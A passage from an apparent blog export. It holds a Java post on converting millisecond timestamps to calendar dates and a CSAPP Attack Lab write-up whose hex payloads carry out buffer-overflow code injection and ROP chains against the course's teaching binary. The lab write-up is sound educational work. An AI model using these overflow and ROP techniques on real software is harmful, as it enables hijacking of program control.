1000;\n    private final long timePerMinute = 1000*60;\n    private final long timePerHour = 3600*1000;\n    private final long timePerDay = 24*3600*1000;\n    private final long timePerPingNian = 365*timePerDay;\n    private final long timePerLeapYear = 366*timePerDay;\n    private final long timeOf1970And1971 = timePerPingNian+timePerPingNian;\n    private final long timePer4Year = (long)(365.25*4*timePerDay);\n    private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay;\n    private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971;\n    private final int[] daysPerMonth = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};\n\n    private boolean setMinuteAndSecond(long milliTime) {\n\n        assert milliTime<timePerDay;\n        if(milliTime>=timePerDay)\n            return false;\n\n        hour = (int)(milliTime/timePerHour);\n        long t = milliTime%timePerHour;\n        minute = (int)(t/timePerMinute);\n        t = t%timePerMinute;\n        second = (int)(t/timePerSecond);\n\n        return true;\n    }\n\n    private boolean setMonthAndDay(long milliTime, boolean isLeapYear) {\n\n        //this func should handle  the case where milliTime == 0;\n        //this func get the milliseconds within 1 year;\n\n        assert milliTime<=timePerLeapYear && isLeapYear || milliTime<=timePerPingNian && !isLeapYear;\n        if(milliTime>timePerLeapYear && isLeapYear || milliTime>timePerPingNian && !isLeapYear) {\n            return false;\n        }\n\n        daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February;\n\n        int cnt = -1;\n\n        do{\n            milliTime -= daysPerMonth[++cnt]*timePerDay;\n        }while (milliTime>=0);\n\n        month = cnt+1;  //for that the cnt begin from 0, but month begin from 1;\n        long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;\n        day = (int)(timeOfLastMonth/timePerDay)+1;\n\n        setMinuteAndSecond(timeOfLastMonth % timePerDay);\n\n        return true;\n    }\n\n    private boolean setDataFile(long milliTime) {\n        if(milliTime<0)\n            return false;\n\n        boolean is1970Or1971 = milliTime<timeOf1970And1971 ? true : false;\n        boolean is20Century = milliTime<timeOf1970To2000 ? true: false; \n       \t//if equal is 2000 1 1 0:0:0\n\n        if(is1970Or1971) {\n            year = milliTime>=timePerPingNian ? 1971 : 1970;\n            setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false);\n            return true;\n        }\n\n        if(is20Century) {\n            long t = (milliTime-timeOf1970And1971)/timePer4Year;  \n            long t1 = milliTime-timeOf1970And1971-t*timePer4Year;\n\n            long t2 = t1-timePerLeapYear;\n            boolean isLeapYear = t2<0;\n            long t3 = isLeapYear ? 0 : t2/timePerPingNian+1;\n\n            year = (int)(1972+t*4+t3);\n\n            long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);\n            setMonthAndDay(l, isLeapYear);\n\n            return true;\n        }\n\n        long p = milliTime-timeOf1970To2000;\n\n        long t1 = p/timeEvery400Year;\n        long p1 = p-t1*timeEvery400Year;\n\n        long t2 = p1/timePer4Year;\n        long tN = t2/25;    \n      \t//in every 400 years, other year such as xy00(y!=0) is not leap year;\n        \n      \tlong p2 = p1-t2*timePer4Year;\n        p2 += tN*timePerDay;\n\n        long t3 = p2-timePerLeapYear;\n\n        boolean isLeapYear = t3<0;\n        long t4 = isLeapYear ? 0 : t3/timePerPingNian+1;\n\n        year = (int)(2000+t1*400+t2*4+t4);\n\n        long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);\n        setMonthAndDay(lt, isLeapYear);\n        return true;\n    }\n}\n```\n\n### 思路\n\n#### 设置时分秒（函数setMinuteAndSecond）\n\n- 函数的输入是 小于 每天毫秒数  的一个整数\n- 因为是从0:0:0开始计时，所以很好算\n- 直接除以每小时毫秒数，结果就是 要求的小时数\n- 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数\n- 以此类推，算出秒数\n\n#### 设置月和日（函数setMonthAndDay）\n\n- 函数的输入为  小于  每年毫秒数  一个整数\n- 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。**注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59**\n- 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）\n\n#### 设置年份（在函数setDataFile中）\n\n- 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。**注意，等于也是，原因如上所述。**然后调用setMonthAndDay函数，设置日月\n\n- 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。\n\n  然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$\n\n- 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$\n\n  接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$\n\n  接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$\n\n  接下来调用setMonthAndDay函数设置月份日期","content":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyDate</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> year;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> month;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> day;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> hour;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> minute;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> second;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerSecond = <span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerMinute = <span class=\"number\">1000</span>*<span class=\"number\">60</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerHour = <span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerDay = <span class=\"number\">24</span>*<span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerPingNian = <span class=\"number\">365</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerLeapYear = <span class=\"number\">366</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970And1971 = timePerPingNian+timePerPingNian;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePer4Year = (<span class=\"keyword\">long</span>)(<span class=\"number\">365.25</span>*<span class=\"number\">4</span>*timePerDay);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeEvery400Year = timePer4Year*<span class=\"number\">100</span> - <span class=\"number\">3</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970To2000 = timePer4Year*<span class=\"number\">7</span>+timeOf1970And1971;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] daysPerMonth = &#123;<span class=\"number\">31</span>, <span class=\"number\">28</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMinuteAndSecond</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;timePerDay;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;=timePerDay)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        hour = (<span class=\"keyword\">int</span>)(milliTime/timePerHour);</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t = milliTime%timePerHour;</span><br><span class=\"line\">        minute = (<span class=\"keyword\">int</span>)(t/timePerMinute);</span><br><span class=\"line\">        t = t%timePerMinute;</span><br><span class=\"line\">        second = (<span class=\"keyword\">int</span>)(t/timePerSecond);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMonthAndDay</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime, <span class=\"keyword\">boolean</span> isLeapYear)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//this func should handle  the case where milliTime == 0;</span></span><br><span class=\"line\">        <span class=\"comment\">//this func get the milliseconds within 1 year;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        daysPerMonth[<span class=\"number\">1</span>] = isLeapYear ? <span class=\"number\">29</span> : <span class=\"number\">28</span>; <span class=\"comment\">//set the days of February;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">            milliTime -= daysPerMonth[++cnt]*timePerDay;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">while</span> (milliTime&gt;=<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        month = cnt+<span class=\"number\">1</span>;  <span class=\"comment\">//for that the cnt begin from 0, but month begin from 1;</span></span><br><span class=\"line\">        <span class=\"keyword\">long</span> timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;</span><br><span class=\"line\">        day = (<span class=\"keyword\">int</span>)(timeOfLastMonth/timePerDay)+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        setMinuteAndSecond(timeOfLastMonth % timePerDay);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setDataFile</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is1970Or1971 = milliTime&lt;timeOf1970And1971 ? <span class=\"keyword\">true</span> : <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is20Century = milliTime&lt;timeOf1970To2000 ? <span class=\"keyword\">true</span>: <span class=\"keyword\">false</span>; </span><br><span class=\"line\">       \t<span class=\"comment\">//if equal is 2000 1 1 0:0:0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is1970Or1971) &#123;</span><br><span class=\"line\">            year = milliTime&gt;=timePerPingNian ? <span class=\"number\">1971</span> : <span class=\"number\">1970</span>;</span><br><span class=\"line\">            setMonthAndDay(year==<span class=\"number\">1971</span> ? milliTime-timePerPingNian : milliTime, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is20Century) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t = (milliTime-timeOf1970And1971)/timePer4Year;  </span><br><span class=\"line\">            <span class=\"keyword\">long</span> t1 = milliTime-timeOf1970And1971-t*timePer4Year;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> t2 = t1-timePerLeapYear;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLeapYear = t2&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t3 = isLeapYear ? <span class=\"number\">0</span> : t2/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            year = (<span class=\"keyword\">int</span>)(<span class=\"number\">1972</span>+t*<span class=\"number\">4</span>+t3);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);</span><br><span class=\"line\">            setMonthAndDay(l, isLeapYear);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> p = milliTime-timeOf1970To2000;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t1 = p/timeEvery400Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> p1 = p-t1*timeEvery400Year;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t2 = p1/timePer4Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> tN = t2/<span class=\"number\">25</span>;    </span><br><span class=\"line\">      \t<span class=\"comment\">//in every 400 years, other year such as xy00(y!=0) is not leap year;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      \t<span class=\"keyword\">long</span> p2 = p1-t2*timePer4Year;</span><br><span class=\"line\">        p2 += tN*timePerDay;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t3 = p2-timePerLeapYear;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> isLeapYear = t3&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t4 = isLeapYear ? <span class=\"number\">0</span> : t3/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        year = (<span class=\"keyword\">int</span>)(<span class=\"number\">2000</span>+t1*<span class=\"number\">400</span>+t2*<span class=\"number\">4</span>+t4);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);</span><br><span class=\"line\">        setMonthAndDay(lt, isLeapYear);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"设置时分秒（函数setMinuteAndSecond）\"><a href=\"#设置时分秒（函数setMinuteAndSecond）\" class=\"headerlink\" title=\"设置时分秒（函数setMinuteAndSecond）\"></a>设置时分秒（函数setMinuteAndSecond）</h4><ul>\n<li>函数的输入是 小于 每天毫秒数  的一个整数</li>\n<li>因为是从0:0:0开始计时，所以很好算</li>\n<li>直接除以每小时毫秒数，结果就是 要求的小时数</li>\n<li>然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数</li>\n<li>以此类推，算出秒数</li>\n</ul>\n<h4 id=\"设置月和日（函数setMonthAndDay）\"><a href=\"#设置月和日（函数setMonthAndDay）\" class=\"headerlink\" title=\"设置月和日（函数setMonthAndDay）\"></a>设置月和日（函数setMonthAndDay）</h4><ul>\n<li>函数的输入为  小于  每年毫秒数  一个整数</li>\n<li>依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。<strong>注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59</strong></li>\n<li>通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）</li>\n</ul>\n<h4 id=\"设置年份（在函数setDataFile中）\"><a href=\"#设置年份（在函数setDataFile中）\" class=\"headerlink\" title=\"设置年份（在函数setDataFile中）\"></a>设置年份（在函数setDataFile中）</h4><ul>\n<li><p>对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。<strong>注意，等于也是，原因如上所述。</strong>然后调用setMonthAndDay函数，设置日月</p>\n</li>\n<li><p>对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。</p>\n<p>然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$</p>\n</li>\n<li><p>然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$</p>\n<p>接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$</p>\n<p>接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$</p>\n<p>接下来调用setMonthAndDay函数设置月份日期</p>\n</li>\n</ul>\n","slug":"从时间戳（毫秒）计算日历","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"时间戳","slug":"时间戳","permalink":"https://h-zex.github.io/tags/时间戳/"},{"name":"日历","slug":"日历","permalink":"https://h-zex.github.io/tags/日历/"}]},{"title":"CSAPP Attack Lab","date":"2017-09-16T05:18:56.000Z","path":"2017/09/16/CSAPP-Attack-Lab/","text":"CSAPP Attack Lab 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符 第一题答案123456789aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa/* this five lines fill the buf */c0 17 40 00 00 00 00 00 /* touch1's addr */ 思路 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上touch1的地址（直接用十六进制写），然后用hex2raw转换后输入即可AC 第二题答案123456789101112131415161718ec 17 40 00 00 00 00 00 /* touch2的地址 */48 83 ec 30/* sub $0x30, %rsp */48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/c3 /* retq */aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa /* 填充的字符串 */80 dc 61 55/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */ 思路 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址 第三题答案1234567891011121314151617181920212223242526272829fa 18 40 00 00 00 00 00 /* touch3 addr, in 0x5561dc78 */48 83 ec 30 /* sub $0x30,%rsp, in 0x5561dc80 */48 c7 c7 90 dc 61 55 /* mov $0x5561dc90,%rdi */c3 /* retq will ret to 0x5561dc78 */ 00 00 00 00 /*fill the extra space */35 39 62 39 39 37 66 61 00 /* string \"59b997fa\" ，in 0x5561dc90 */aa aa aa aa aa aa aa /* fill the extra space */ 80 dc 61 55 00 00 00 00 /* 0x5561dc80, our code's begin addr *//* * just before our attack code is run, * rsp == 0x5561dca0 * return addr in 0x5561dca0*/ 思路 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶 第四题答案123456789101112131415161718aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa/* this five line fill the buf */cc 19 40 00 00 00 00 00 /* 0x4019cc pop %rax; nop; ret */fa 97 b9 59 00 00 00 00 /* 0x59b997fa */a2 19 40 00 00 00 00 00 /* 0x4019a2 movq %rax, %rdi; ret */ec 17 40 00 00 00 00 00 /* touch2 0x4017ec */ 思路 构造rop链，在0x4019ca处有b8 29 58 90 c3 mov $0xc3905829,%eax，观察字节码，在0x4019cc处的58是pop rax，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax 在0x4019a0有8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax，观察字节码，0x4019a2处有48 89 c7，也就是mov %rax, %rdi，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了 第五题答案12345678910111213141516171819202122232425262728293031323334aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa /* this five lines fill space of buf */17 2b 40 00 00 00 00 00 /* 402b17, pop rsi,ret to this, assume that rsp is K */20 00 00 00 00 00 00 00 /* the data pop to rsi */00 00 00 00 00 00 00 00 /* the data are pop to r15 *//* after all pop, rsp is K+16 */06 1a 40 00 00 00 00 00 /* 401a06, movq rsp, rax, ret to here, rsp is K+24 */a2 19 40 00 00 00 00 00 /* 4019a2, movq rax, rdi */d6 19 40 00 00 00 00 00 /* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */c5 19 40 00 00 00 00 00 /* 4019c5, mov rax, rdi */fa 18 40 00 00 00 00 00 /* 4018fa touch3 */35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 /* 0x59b997fa in here */ 思路 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的lea (%rdi,%rsi,1),%rax符合要求 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到pop %r14，该指令第二个字节5e是pop %rsi，因为该指令跟ret之间还有pop %r15，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。 